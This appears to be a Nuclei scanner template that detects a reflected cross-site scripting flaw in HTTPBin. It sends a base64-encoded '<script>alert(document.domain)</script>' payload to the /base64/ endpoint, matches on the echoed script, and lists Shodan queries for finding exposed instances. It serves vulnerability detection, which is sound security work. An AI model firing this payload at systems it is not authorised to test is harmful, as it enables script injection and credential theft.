http:
- matchers:
  - part: body
    regex:
    - ^<script>alert\(document.domain\)</script>$
    type: regex
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/base64/PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+'
id: httpbin-xss
info:
  author: Adam Crosser
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 7.2
    cwe-id: CWE-79
  description: HTTPBin contains a cross-site scripting vulnerability which can allow
    an attacker to execute arbitrary script. This can allow the attacker to steal
    cookie-based authentication credentials and launch other attacks.
  metadata:
    max-request: 1
    shodan-query:
    - html:"https://github.com/requests/httpbin"
    - title:"httpbin.org"
  name: HTTPBin - Cross-Site Scripting
  reference:
  - https://github.com/postmanlabs/httpbin
  severity: high
  tags: xss,httpbin,oss
